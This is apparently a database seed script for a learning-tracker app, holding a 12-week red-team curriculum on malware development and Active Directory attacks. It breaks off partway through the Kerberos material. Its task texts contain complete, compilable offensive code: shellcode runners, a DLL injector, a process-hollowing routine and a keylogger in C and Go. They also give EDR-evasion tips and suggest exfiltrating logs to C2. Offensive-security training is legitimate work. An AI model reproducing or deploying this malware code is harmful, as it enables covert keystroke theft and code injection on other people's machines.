import Database from 'better-sqlite3';
import { drizzle } from 'drizzle-orm/better-sqlite3';
import * as schema from '../src/lib/server/schema';

const sqlite = new Database('data/quest-log.db');
const db = drizzle(sqlite, { schema });

interface TaskData {
	title: string;
	description: string;
	details: string;
}

interface ModuleData {
	name: string;
	description: string;
	tasks: TaskData[];
}

interface PathData {
	name: string;
	description: string;
	language: string;
	color: string;
	skills: string;
	startHint: string;
	difficulty: string;
	estimatedWeeks: number;
	schedule: string;
	modules: ModuleData[];
}

const redteamPath: PathData = {
	name: 'Red Team Learning Path',
	description: 'A 3-month intensive curriculum for offensive security, focusing on custom malware development and Active Directory attacks.',
	language: 'Go+Python+C',
	color: 'rose',
	skills: 'malware development, Windows internals, Active Directory, EDR evasion, C2 development, lateral movement',
	startHint: 'Start by building a home lab with a vulnerable AD environment',
	difficulty: 'advanced',
	estimatedWeeks: 12,
	schedule: `## 12-Week Red Team Learning Schedule

### Month 1: Foundations

#### Week 1-2: Windows Internals & C Fundamentals
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon-Tue | Windows API | CreateProcess, VirtualAlloc, WriteProcessMemory |
| Wed-Thu | Process Architecture | PE format, threads, memory layout |
| Fri | Detection Basics | How AV/EDR works |
| Weekend | Projects | Basic shellcode runner, DLL injector |

#### Week 3-4: Active Directory Fundamentals
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon-Tue | AD Architecture | Domains, forests, trusts, OUs, GPOs |
| Wed-Thu | Authentication | Kerberos flow, NTLM, tickets |
| Fri | Misconfigurations | Kerberoastable accounts, delegation |
| Weekend | Lab Setup | Build vulnerable AD home lab |

### Month 2: Core Techniques

#### Week 5-6: Offensive Tooling Development
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon-Tue | Credential Dumping | LSASS, SAM, DPAPI |
| Wed-Thu | Shellcode Loaders | Encryption, syscalls, evasion |
| Fri | C2 Basics | HTTP beaconing, command execution |
| Weekend | Integration | Combine tools into workflow |

#### Week 7-8: AD Attack Paths
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon-Tue | Reconnaissance | BloodHound, PowerView, LDAP |
| Wed-Thu | Credential Attacks | Kerberoasting, AS-REP, delegation |
| Fri | Lateral Movement | PTH, PTT, WMI, WinRM |
| Weekend | Domain Dominance | DCSync, Golden Ticket |

### Month 3: Evasion & Integration

#### Week 9-10: EDR Evasion
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon-Tue | Detection Mechanisms | Hooks, ETW, AMSI, kernel callbacks |
| Wed-Thu | Bypass Techniques | Direct syscalls, unhooking, patching |
| Fri | Sleep Obfuscation | Memory encryption during sleep |
| Weekend | Testing | Validate against Defender/Elastic |

#### Week 11-12: Full Chain Operations
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon-Tue | Initial Access | Phishing payloads, custom loader |
| Wed-Thu | Post-Exploitation | Credential harvest, lateral movement |
| Fri | Persistence | Multiple mechanisms, cleanup |
| Weekend | Capstone | Full compromise with custom tools |

### Daily Commitment: 3-4 hours

### Lab Requirements
- 32GB+ RAM recommended
- Windows Server 2022 (DC)
- Windows 10/11 workstations
- Kali/Ubuntu attacker box
- Optional: Elastic Security for detection`,
	modules: [
		{
			name: 'Windows Internals & C Fundamentals',
			description: 'Learn how Windows works under the hood before trying to subvert it',
			tasks: [
				{
					title: 'Master Windows API Basics',
					description: 'Learn essential Windows API functions for process and memory manipulation',
					details: `## Windows API Fundamentals

### Key Functions to Master

#### Process Creation & Management
\`\`\`c
#include <windows.h>
#include <stdio.h>

int main() {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Create a new process
    if (CreateProcess(
        "C:\\\\Windows\\\\System32\\\\notepad.exe",
        NULL,           // Command line
        NULL,           // Process security attributes
        NULL,           // Thread security attributes
        FALSE,          // Inherit handles
        0,              // Creation flags
        NULL,           // Environment
        NULL,           // Current directory
        &si,
        &pi
    )) {
        printf("[+] Process created: PID %d\\n", pi.dwProcessId);

        // Wait for process to exit
        WaitForSingleObject(pi.hProcess, INFINITE);

        // Clean up handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return 0;
}
\`\`\`

#### Memory Allocation
\`\`\`c
// Allocate executable memory in current process
LPVOID addr = VirtualAlloc(
    NULL,                   // Let system choose address
    shellcode_size,         // Size of allocation
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE  // RWX permissions
);

if (addr == NULL) {
    printf("[-] VirtualAlloc failed: %d\\n", GetLastError());
    return 1;
}

// Copy shellcode to allocated memory
memcpy(addr, shellcode, shellcode_size);

// Execute
((void(*)())addr)();
\`\`\`

#### Remote Process Memory
\`\`\`c
// Open target process
HANDLE hProcess = OpenProcess(
    PROCESS_ALL_ACCESS,
    FALSE,
    targetPID
);

// Allocate memory in remote process
LPVOID remoteAddr = VirtualAllocEx(
    hProcess,
    NULL,
    shellcode_size,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);

// Write to remote process
WriteProcessMemory(
    hProcess,
    remoteAddr,
    shellcode,
    shellcode_size,
    NULL
);
\`\`\`

### Common Patterns

| Pattern | APIs Used | Purpose |
|---------|-----------|---------|
| Local Execution | VirtualAlloc, memcpy | Run shellcode in current process |
| Remote Injection | OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread | Inject into another process |
| Process Hollowing | CreateProcess (SUSPENDED), NtUnmapViewOfSection, WriteProcessMemory, ResumeThread | Replace legitimate process |

### Exercises
1. Write a program that lists all running processes
2. Create a program that reads memory from another process
3. Build a simple process monitor using Windows API`
				},
				{
					title: 'Understand PE File Format',
					description: 'Learn the structure of Windows executables for loader development',
					details: `## PE (Portable Executable) Format

### Structure Overview
\`\`\`
┌─────────────────────────────────┐
│         DOS Header              │  Legacy compatibility
│         (64 bytes)              │
├─────────────────────────────────┤
│         DOS Stub                │  "This program cannot..."
├─────────────────────────────────┤
│         PE Signature            │  "PE\\0\\0"
├─────────────────────────────────┤
│         File Header             │  Machine type, sections count
│         (20 bytes)              │
├─────────────────────────────────┤
│      Optional Header            │  Entry point, image base
│      (32/64-bit specific)       │
├─────────────────────────────────┤
│      Section Headers            │  .text, .data, .rdata, etc.
├─────────────────────────────────┤
│         Sections                │  Actual code and data
│                                 │
│  ┌──────────────────────────┐  │
│  │ .text  (code)            │  │
│  ├──────────────────────────┤  │
│  │ .data  (initialized)     │  │
│  ├──────────────────────────┤  │
│  │ .rdata (read-only)       │  │
│  ├──────────────────────────┤  │
│  │ .rsrc  (resources)       │  │
│  └──────────────────────────┘  │
└─────────────────────────────────┘
\`\`\`

### PE Parser Implementation

\`\`\`c
#include <windows.h>
#include <stdio.h>

void ParsePE(const char* filepath) {
    HANDLE hFile = CreateFileA(filepath, GENERIC_READ,
        FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

    DWORD fileSize = GetFileSize(hFile, NULL);
    LPVOID fileData = malloc(fileSize);
    ReadFile(hFile, fileData, fileSize, NULL, NULL);
    CloseHandle(hFile);

    // DOS Header
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
    printf("[*] DOS Header:\\n");
    printf("    e_magic: 0x%X (MZ)\\n", dosHeader->e_magic);
    printf("    e_lfanew: 0x%X\\n", dosHeader->e_lfanew);

    // PE Header
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)
        ((BYTE*)fileData + dosHeader->e_lfanew);

    printf("\\n[*] PE Header:\\n");
    printf("    Signature: 0x%X\\n", ntHeaders->Signature);
    printf("    Machine: 0x%X\\n", ntHeaders->FileHeader.Machine);
    printf("    Sections: %d\\n", ntHeaders->FileHeader.NumberOfSections);

    // Optional Header
    printf("\\n[*] Optional Header:\\n");
    printf("    Entry Point: 0x%X\\n",
        ntHeaders->OptionalHeader.AddressOfEntryPoint);
    printf("    Image Base: 0x%llX\\n",
        ntHeaders->OptionalHeader.ImageBase);
    printf("    Section Alignment: 0x%X\\n",
        ntHeaders->OptionalHeader.SectionAlignment);

    // Sections
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    printf("\\n[*] Sections:\\n");

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        printf("    %.8s\\n", section[i].Name);
        printf("        Virtual Address: 0x%X\\n",
            section[i].VirtualAddress);
        printf("        Virtual Size: 0x%X\\n",
            section[i].Misc.VirtualSize);
        printf("        Raw Size: 0x%X\\n",
            section[i].SizeOfRawData);
        printf("        Characteristics: 0x%X\\n",
            section[i].Characteristics);
    }

    free(fileData);
}
\`\`\`

### Important Data Directories

| Index | Name | Purpose |
|-------|------|---------|
| 0 | Export Table | Functions exported by DLL |
| 1 | Import Table | Functions imported from DLLs |
| 5 | Base Relocation | Address fixups for ASLR |
| 14 | CLR Runtime | .NET metadata |

### Why This Matters for Red Team
- **Loaders** need to parse PE to map executables manually
- **Packers** modify PE structure to hide payloads
- **Reflective DLL injection** requires PE parsing in memory
- **Import table hooking** needs to find IAT location`
				},
				{
					title: 'Build a Basic Shellcode Runner',
					description: 'Create your first shellcode execution tool in C',
					details: `## Shellcode Runner in C

### Basic Runner (VirtualAlloc + Function Pointer)

\`\`\`c
#include <windows.h>
#include <stdio.h>

// msfvenom -p windows/x64/exec CMD=calc.exe -f c
unsigned char shellcode[] =
    "\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51..."
    // ... rest of shellcode

int main() {
    printf("[*] Shellcode size: %zu bytes\\n", sizeof(shellcode));

    // Allocate RWX memory
    LPVOID addr = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (addr == NULL) {
        printf("[-] VirtualAlloc failed: %d\\n", GetLastError());
        return 1;
    }

    printf("[+] Allocated memory at: %p\\n", addr);

    // Copy shellcode
    memcpy(addr, shellcode, sizeof(shellcode));
    printf("[+] Shellcode copied\\n");

    // Execute via function pointer
    printf("[*] Executing shellcode...\\n");
    ((void(*)())addr)();

    return 0;
}
\`\`\`

### Improved Version (RW -> RX)

\`\`\`c
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = { /* ... */ };

int main() {
    // Allocate as RW (less suspicious)
    LPVOID addr = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE  // Not executable yet
    );

    // Copy shellcode
    memcpy(addr, shellcode, sizeof(shellcode));

    // Change to RX (no write, more realistic)
    DWORD oldProtect;
    VirtualProtect(addr, sizeof(shellcode),
        PAGE_EXECUTE_READ, &oldProtect);

    // Execute
    ((void(*)())addr)();

    return 0;
}
\`\`\`

### Using CreateThread

\`\`\`c
int main() {
    LPVOID addr = VirtualAlloc(NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    memcpy(addr, shellcode, sizeof(shellcode));

    // Create thread to execute
    HANDLE hThread = CreateThread(
        NULL,           // Security attributes
        0,              // Stack size (default)
        (LPTHREAD_START_ROUTINE)addr,
        NULL,           // Parameter
        0,              // Creation flags
        NULL            // Thread ID
    );

    // Wait for thread
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    return 0;
}
\`\`\`

### Compilation

\`\`\`bash
# 64-bit
x86_64-w64-mingw32-gcc runner.c -o runner.exe

# 32-bit
i686-w64-mingw32-gcc runner.c -o runner32.exe

# With optimizations
x86_64-w64-mingw32-gcc -O2 -s runner.c -o runner.exe
\`\`\`

### Detection Considerations
- **VirtualAlloc + RWX** is highly suspicious
- **CreateThread to non-module address** triggers alerts
- Modern EDR hooks these APIs in ntdll.dll

### Next Steps
1. Add XOR encryption to shellcode
2. Use VirtualProtect instead of RWX
3. Implement direct syscalls to bypass hooks`
				},
				{
					title: 'Build a DLL Injector',
					description: 'Implement classic DLL injection using CreateRemoteThread',
					details: `## DLL Injection with CreateRemoteThread

### Attack Flow
\`\`\`
1. OpenProcess(target)
2. VirtualAllocEx(remote memory for DLL path)
3. WriteProcessMemory(write DLL path)
4. GetProcAddress(LoadLibraryA)
5. CreateRemoteThread(call LoadLibrary with DLL path)
\`\`\`

### Implementation

\`\`\`c
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

DWORD FindProcessId(const char* processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32 = { sizeof(pe32) };

    if (Process32First(snapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                CloseHandle(snapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(snapshot, &pe32));
    }

    CloseHandle(snapshot);
    return 0;
}

int InjectDLL(DWORD pid, const char* dllPath) {
    printf("[*] Injecting into PID: %d\\n", pid);

    // 1. Open target process
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        pid
    );

    if (hProcess == NULL) {
        printf("[-] OpenProcess failed: %d\\n", GetLastError());
        return 1;
    }
    printf("[+] Opened process handle: %p\\n", hProcess);

    // 2. Allocate memory in target for DLL path
    size_t pathLen = strlen(dllPath) + 1;
    LPVOID remoteBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        pathLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (remoteBuffer == NULL) {
        printf("[-] VirtualAllocEx failed: %d\\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Allocated remote buffer: %p\\n", remoteBuffer);

    // 3. Write DLL path to target
    if (!WriteProcessMemory(hProcess, remoteBuffer,
            dllPath, pathLen, NULL)) {
        printf("[-] WriteProcessMemory failed: %d\\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Wrote DLL path to remote process\\n");

    // 4. Get LoadLibraryA address
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    FARPROC loadLibraryAddr = GetProcAddress(hKernel32, "LoadLibraryA");
    printf("[+] LoadLibraryA address: %p\\n", loadLibraryAddr);

    // 5. Create remote thread calling LoadLibrary
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)loadLibraryAddr,
        remoteBuffer,   // DLL path as argument
        0,
        NULL
    );

    if (hThread == NULL) {
        printf("[-] CreateRemoteThread failed: %d\\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Created remote thread: %p\\n", hThread);

    // Wait for DLL to load
    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    printf("[+] Injection complete!\\n");
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Usage: %s <process_name> <dll_path>\\n", argv[0]);
        return 1;
    }

    DWORD pid = FindProcessId(argv[1]);
    if (pid == 0) {
        printf("[-] Process not found: %s\\n", argv[1]);
        return 1;
    }

    return InjectDLL(pid, argv[2]);
}
\`\`\`

### Simple Payload DLL

\`\`\`c
// payload.c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            MessageBoxA(NULL, "DLL Injected!", "Success", MB_OK);
            break;
    }
    return TRUE;
}
\`\`\`

### Compilation
\`\`\`bash
# Compile DLL
x86_64-w64-mingw32-gcc -shared -o payload.dll payload.c

# Compile injector
x86_64-w64-mingw32-gcc injector.c -o injector.exe
\`\`\`

### Why This Gets Detected
- CreateRemoteThread to LoadLibraryA is well-known pattern
- EDR monitors these API call sequences
- Thread creation in remote process is suspicious`
				},
				{
					title: 'Implement Process Hollowing',
					description: 'Replace a legitimate process with malicious code',
					details: `## Process Hollowing Technique

### Overview
\`\`\`
1. Create legitimate process in SUSPENDED state
2. Unmap the original executable from memory
3. Allocate new memory in the process
4. Write malicious PE into the process
5. Set thread context to new entry point
6. Resume the thread
\`\`\`

### Implementation

\`\`\`c
#include <windows.h>
#include <stdio.h>

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

int HollowProcess(const char* targetPath, LPVOID payload, DWORD payloadSize) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    // 1. Create suspended process
    printf("[*] Creating suspended process: %s\\n", targetPath);

    if (!CreateProcessA(
        targetPath,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        printf("[-] CreateProcess failed: %d\\n", GetLastError());
        return 1;
    }
    printf("[+] Created process PID: %d\\n", pi.dwProcessId);

    // 2. Get thread context (contains image base)
    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[-] GetThreadContext failed\\n");
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }

    // Read PEB to get image base
    LPVOID pebImageBase;
#ifdef _WIN64
    // PEB->ImageBaseAddress at offset 0x10 from PEB
    ReadProcessMemory(pi.hProcess,
        (LPVOID)(ctx.Rdx + 0x10),
        &pebImageBase, sizeof(LPVOID), NULL);
    printf("[+] Original image base: %p\\n", pebImageBase);
#else
    ReadProcessMemory(pi.hProcess,
        (LPVOID)(ctx.Ebx + 0x8),
        &pebImageBase, sizeof(LPVOID), NULL);
#endif

    // 3. Unmap the original executable
    pNtUnmapViewOfSection NtUnmapViewOfSection =
        (pNtUnmapViewOfSection)GetProcAddress(
            GetModuleHandleA("ntdll.dll"),
            "NtUnmapViewOfSection");

    NtUnmapViewOfSection(pi.hProcess, pebImageBase);
    printf("[+] Unmapped original image\\n");

    // 4. Parse payload PE headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)
        ((BYTE*)payload + dosHeader->e_lfanew);

    DWORD imageSize = ntHeaders->OptionalHeader.SizeOfImage;
    LPVOID preferredBase = (LPVOID)ntHeaders->OptionalHeader.ImageBase;

    // 5. Allocate memory at preferred base
    LPVOID newBase = VirtualAllocEx(
        pi.hProcess,
        preferredBase,
        imageSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (newBase == NULL) {
        // Try any address if preferred fails
        newBase = VirtualAllocEx(pi.hProcess, NULL, imageSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    printf("[+] Allocated memory at: %p\\n", newBase);

    // 6. Write headers
    WriteProcessMemory(pi.hProcess, newBase, payload,
        ntHeaders->OptionalHeader.SizeOfHeaders, NULL);

    // 7. Write sections
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        LPVOID sectionDest = (BYTE*)newBase + section[i].VirtualAddress;
        LPVOID sectionSrc = (BYTE*)payload + section[i].PointerToRawData;

        WriteProcessMemory(pi.hProcess, sectionDest, sectionSrc,
            section[i].SizeOfRawData, NULL);

        printf("[+] Wrote section: %.8s\\n", section[i].Name);
    }

    // 8. Update PEB with new image base
#ifdef _WIN64
    WriteProcessMemory(pi.hProcess, (LPVOID)(ctx.Rdx + 0x10),
        &newBase, sizeof(LPVOID), NULL);

    // 9. Set entry point
    ctx.Rcx = (DWORD64)newBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#else
    WriteProcessMemory(pi.hProcess, (LPVOID)(ctx.Ebx + 0x8),
        &newBase, sizeof(LPVOID), NULL);
    ctx.Eax = (DWORD)newBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#endif

    SetThreadContext(pi.hThread, &ctx);
    printf("[+] Updated thread context\\n");

    // 10. Resume execution
    ResumeThread(pi.hThread);
    printf("[+] Process hollowing complete!\\n");

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
\`\`\`

### Detection Vectors
- Suspended process creation followed by memory operations
- NtUnmapViewOfSection on main module
- WriteProcessMemory to executable sections
- Thread context modification

### Evasion Considerations
- Use syscalls instead of API calls
- Avoid CREATE_SUSPENDED (use NtCreateUserProcess)
- Consider process doppelgänging instead`
				},
				{
					title: 'Build a Basic Keylogger',
					description: 'Capture keystrokes using Windows hooks',
					details: `## Keylogger with SetWindowsHookEx

### Implementation

\`\`\`c
#include <windows.h>
#include <stdio.h>

HHOOK hHook = NULL;
FILE* logFile = NULL;

// Get active window title
void LogWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    char title[256];
    GetWindowTextA(hwnd, title, sizeof(title));
    fprintf(logFile, "\\n[Window: %s]\\n", title);
    fflush(logFile);
}

// Keyboard hook callback
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbStruct->vkCode;

        static HWND lastWindow = NULL;
        HWND currentWindow = GetForegroundWindow();

        // Log window change
        if (currentWindow != lastWindow) {
            LogWindowTitle();
            lastWindow = currentWindow;
        }

        // Get key state for shift/caps
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);

        // Convert to character
        char buffer[5] = {0};
        int result = ToAscii(vkCode, kbStruct->scanCode,
            keyboardState, (LPWORD)buffer, 0);

        if (result == 1) {
            fprintf(logFile, "%c", buffer[0]);
        } else {
            // Handle special keys
            switch (vkCode) {
                case VK_RETURN: fprintf(logFile, "[ENTER]\\n"); break;
                case VK_BACK:   fprintf(logFile, "[BACKSPACE]"); break;
                case VK_TAB:    fprintf(logFile, "[TAB]"); break;
                case VK_ESCAPE: fprintf(logFile, "[ESC]"); break;
                case VK_SPACE:  fprintf(logFile, " "); break;
                case VK_LCONTROL:
                case VK_RCONTROL: fprintf(logFile, "[CTRL]"); break;
                case VK_LSHIFT:
                case VK_RSHIFT: break; // Ignore shift alone
                default: fprintf(logFile, "[0x%02X]", vkCode); break;
            }
        }
        fflush(logFile);
    }

    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main() {
    // Open log file
    logFile = fopen("keylog.txt", "a");
    if (!logFile) {
        printf("[-] Failed to open log file\\n");
        return 1;
    }

    fprintf(logFile, "\\n=== Keylogger Started ===\\n");
    fflush(logFile);

    // Install hook
    hHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,     // Low-level keyboard hook
        KeyboardProc,       // Callback function
        GetModuleHandle(NULL),
        0                   // All threads
    );

    if (hHook == NULL) {
        printf("[-] SetWindowsHookEx failed: %d\\n", GetLastError());
        fclose(logFile);
        return 1;
    }

    printf("[+] Keylogger running... Press Ctrl+C to stop\\n");

    // Message loop (required for hooks)
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup
    UnhookWindowsHookEx(hHook);
    fclose(logFile);

    return 0;
}
\`\`\`

### Go Implementation

\`\`\`go
package main

import (
    "fmt"
    "os"
    "syscall"
    "unsafe"
)

var (
    user32              = syscall.NewLazyDLL("user32.dll")
    setWindowsHookExW   = user32.NewProc("SetWindowsHookExW")
    callNextHookEx      = user32.NewProc("CallNextHookEx")
    getMessage          = user32.NewProc("GetMessageW")
    getForegroundWindow = user32.NewProc("GetForegroundWindow")
    getWindowTextW      = user32.NewProc("GetWindowTextW")
)

const WH_KEYBOARD_LL = 13
const WM_KEYDOWN = 0x0100

type KBDLLHOOKSTRUCT struct {
    VkCode      uint32
    ScanCode    uint32
    Flags       uint32
    Time        uint32
    DwExtraInfo uintptr
}

var logFile *os.File

func keyboardProc(nCode int, wParam uintptr, lParam uintptr) uintptr {
    if nCode >= 0 && wParam == WM_KEYDOWN {
        kbStruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
        key := byte(kbStruct.VkCode)

        if key >= 32 && key <= 126 {
            fmt.Fprintf(logFile, "%c", key)
        } else if key == 13 {
            fmt.Fprintln(logFile)
        }
        logFile.Sync()
    }

    ret, _, _ := callNextHookEx.Call(0, uintptr(nCode), wParam, lParam)
    return ret
}

func main() {
    var err error
    logFile, err = os.OpenFile("keylog.txt",
        os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err != nil {
        panic(err)
    }
    defer logFile.Close()

    hook, _, _ := setWindowsHookExW.Call(
        WH_KEYBOARD_LL,
        syscall.NewCallback(keyboardProc),
        0,
        0,
    )

    if hook == 0 {
        panic("Failed to set hook")
    }

    fmt.Println("[+] Keylogger running...")

    // Message loop
    var msg struct {
        hwnd    uintptr
        message uint32
        wParam  uintptr
        lParam  uintptr
        time    uint32
        pt      struct{ x, y int32 }
    }

    for {
        getMessage.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
    }
}
\`\`\`

### Features to Add
- Encrypt log file
- Periodic exfil to C2
- Clipboard monitoring
- Screenshot on specific keywords`
				}
			]
		},
		{
			name: 'Active Directory Fundamentals',
			description: 'Understand the environment you will be attacking',
			tasks: [
				{
					title: 'Understand AD Architecture',
					description: 'Learn domains, forests, trusts, OUs, and GPOs',
					details: `## Active Directory Architecture

### Core Components

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│                          FOREST                                  │
│                     (Security Boundary)                          │
│                                                                  │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │                    ROOT DOMAIN                           │    │
│  │                   (corp.local)                           │    │
│  │                                                          │    │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐     │    │
│  │  │   Domain    │  │   Domain    │  │   Domain    │     │    │
│  │  │ Controllers │  │ Controllers │  │ Controllers │     │    │
│  │  │   (DC01)    │  │   (DC02)    │  │   (DC03)    │     │    │
│  │  └─────────────┘  └─────────────┘  └─────────────┘     │    │
│  │                                                          │    │
│  │  ┌─────────────────────────────────────────────────┐   │    │
│  │  │              CHILD DOMAINS                       │   │    │
│  │  │                                                  │   │    │
│  │  │  ┌──────────────┐    ┌──────────────┐          │   │    │
│  │  │  │ dev.corp.local│    │us.corp.local │          │   │    │
│  │  │  └──────────────┘    └──────────────┘          │   │    │
│  │  └─────────────────────────────────────────────────┘   │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                  │
│                       TRUST RELATIONSHIPS                        │
│                    (Can span to other forests)                   │
└─────────────────────────────────────────────────────────────────┘
\`\`\`

### Organizational Units (OUs)
\`\`\`
DC=corp,DC=local
├── OU=IT
│   ├── OU=Admins
│   │   ├── CN=john.admin
│   │   └── CN=jane.admin
│   └── OU=Helpdesk
│       └── CN=bob.helpdesk
├── OU=Users
│   ├── CN=alice.user
│   └── CN=charlie.user
├── OU=Computers
│   ├── CN=WS01
│   └── CN=WS02
├── OU=Servers
│   ├── CN=SRV01
│   └── CN=SQL01
└── OU=Service Accounts
    ├── CN=svc_sql
    └── CN=svc_backup
\`\`\`

### Group Policy Objects (GPOs)
\`\`\`
GPO: "Workstation Security Policy"
├── Computer Configuration
│   ├── Software Settings
│   ├── Windows Settings
│   │   └── Security Settings
│   │       ├── Account Policies
│   │       ├── Local Policies
│   │       └── Windows Firewall
│   └── Administrative Templates
└── User Configuration
    ├── Software Settings
    └── Administrative Templates
        └── Disable Command Prompt
\`\`\`

### Key Objects for Attacks

| Object Type | Attack Relevance |
|-------------|------------------|
| **Users** | Credentials, group memberships, SPNs |
| **Computers** | Local admin, delegation, sessions |
| **Groups** | Privilege escalation paths |
| **GPOs** | Lateral movement, persistence |
| **Trusts** | Cross-domain attacks |
| **Service Accounts** | Kerberoasting, high privileges |

### PowerShell Enumeration
\`\`\`powershell
# Get domain info
Get-ADDomain

# List all OUs
Get-ADOrganizationalUnit -Filter * | Select Name, DistinguishedName

# List all GPOs
Get-GPO -All | Select DisplayName, Id

# Find trust relationships
Get-ADTrust -Filter *

# List domain controllers
Get-ADDomainController -Filter *
\`\`\``
				},
				{
					title: 'Master Kerberos Authentication',
					description: 'Understand TGT, TGS, PAC and the authentication flow',
					details: `## Kerberos Authentication Flow

### The Three-Headed Dog
\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│                    KERBEROS AUTHENTICATION                       │
└─────────────────────────────────────────────────────────────────┘

       ┌─────────┐                              ┌─────────┐
       │  USER   │                              │   KDC   │
       │ (Alice) │                              │  (DC01) │
       └────┬────┘                              └────┬────┘
            │                                        │
            │  1. AS-REQ (I am Alice)               │
            │  [Encrypted with Alice's hash]        │
            │───────────────────────────────────────▶
            │                                        │
            │  2. AS-REP (Here's your TGT)          │
            │  [TGT encrypted with krbtgt hash]     │
            │◀───────────────────────────────────────
            │                                        │
            │  3. TGS-REQ (I want to access SRV01)  │
            │  [Includes TGT]                        │
            │───────────────────────────────────────▶
            │                                        │
            │  4. TGS-REP (Here's your Service Ticket)│
            │  [Encrypted with service account hash] │
            │◀───────────────────────────────────────
            │                                        │
            │                                        │
       ┌────▼────┐                                   │
       │ SERVICE │  5. AP-REQ (Here's my ticket)    │
       │  (SRV01)│◀──────────────────────────────────
       └─────────┘

\`\`\`

### Ticket Structure

#### TGT (Ticket Granting Ticket)
\`\`\`
┌─────────────────────────────────────────┐
│              TGT Contents                │
├─────────────────────────────────────────┤
│  Username: alice@CORP.LOCAL             │
│  Domain: CORP.LOCAL                      │
│  Validity: Start/End times               │
│  Session Key: [Random key]               │
│  PAC: [Privilege Attribute Certificate]  │
│       - User SID                         │
